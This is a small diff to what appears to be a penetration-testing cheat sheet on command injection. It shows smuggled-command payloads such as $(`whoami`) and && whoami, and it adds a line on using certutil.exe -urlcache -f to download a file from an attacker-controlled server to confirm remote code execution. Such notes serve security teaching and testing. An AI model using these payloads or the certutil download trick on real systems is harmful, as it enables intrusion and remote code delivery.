@@ -2308,6 +2308,7 @@ $(`whoami`)
 && whoami
 ```	
 
+A useful tool in Windows we can use to gain RCE is `certutil.exe` (`certutil.exe -urlcache -f <url> <filename>`). This command is a native Windows CLI program installed as part of Certificate Services. It's handy in engagements because it is a binary signed by Microsoft and allows us to make HTTP/s connections. In our scenario, we can use it to make an HTTP request to download a file from a web server that we control to confirm that the command was executed.
 
 See [this](https://github.com/payloadbox/command-injection-payload-list) cheatsheet for more.
 
